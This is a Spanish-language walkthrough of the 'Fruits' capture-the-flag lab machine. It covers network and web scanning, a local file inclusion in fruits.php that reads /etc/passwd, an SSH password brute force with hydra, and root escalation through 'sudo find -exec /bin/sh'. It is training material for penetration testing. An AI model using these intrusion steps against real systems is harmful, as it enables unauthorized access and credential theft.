# Fruits

[https://thehackerslabs.com/fruits/](https://thehackerslabs.com/fruits/)

![image.png](./imagenes/image.png)

```bash
sudo arp-scan -I eth0 --localnet 
```

![image.png](./imagenes/image%201.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.23
```

![image.png](./imagenes/image%202.png)

- Miramos el puerto 80 en el navegador web
    
    ![image.png](./imagenes/image%203.png)
    

- Miramos por si acaso encontramos alguna pista el código fuente.
    
    `CTRL+U`
    
    ![image.png](./imagenes/image%204.png)
    
    No encontramos nada.
    
- Hacemos **Fuzzing Web** (descubrimiento de directorios y archivos) con **Gobuster** específicamente con archivos con extension php,thml y txt.
    
    ```bash
    gobuster dir -u http://10.0.3.23/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt
    ```
    
    ![image.png](./imagenes/image%205.png)
    

- Probamos el archivo fruits.php en el navegador
    
    ![image.png](./imagenes/image%206.png)
    
    No muestra nada
    

<aside>
💡

Pero al ser un archivo php carga desde el servidor por lo que podríamos agregarle parámetros para ver si nos devuelve algo. 

</aside>

- Vamos a ver si es vulnerable a un **Local File Inclusion (LFI)** pero para ello debemos conocer el parámetro y vamos a **usar WFUZZ. V**amos a intentar alguno que tenga acceso a la carpeta ****`/etc/passwd`.
    
    ```bash
    wfuzz -c -u http://10.0.3.23/fruits.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  
    ```
    
    ![image.png](./imagenes/image%207.png)
    
    Salen muchísimos falsos positivos por tanto vamos a filtrar por ejemplo por caracteres quitando que como vemos se repiten mucho lo de 1 carácter.
    

```bash
wfuzz -c -u http://10.0.3.23/fruits.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 1  
```

![image.png](./imagenes/image%208.png)

- Lo probamos en el navegador `?file=/etc/passwd`
    
    ![image.png](./imagenes/b53aafc2-3683-493b-b614-e58e36179de0.png)
    
    Nos encontramos dos posibles usuarios root y bananaman.
    
- Vamos a intentar hacer fuerza bruta con Hydra al SSH.
    
    ```bash
    hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.23 
    ```
    
    ![image.png](./imagenes/image%209.png)
    

- Nos conectamos por SSH con las credenciales optenidas
    
    ```bash
    ssh bananaman@10.0.3.23
    ```
    
    ![image.png](./imagenes/image%2010.png)
    

- Probamos escalada de privilegios con `sudo -l`.
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2011.png)
    

- Investigamos el comando find con sudo en [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/)
    
    ![image.png](./imagenes/image%2012.png)
    
    `sudo find . -exec /bin/sh \; -quit`
    
    ![image.png](./imagenes/image%2013.png)
    

- Ejecutamos `bash -p` para  **mantener los privilegios elevados** si el shell se inició con permisos de administrador o de otro usuario. Normalmente, Bash puede reducir esos privilegios por seguridad, pero con `-p` evita hacerlo.
    
    `bash -p`
    
    ![image.png](./imagenes/image%2014.png)
  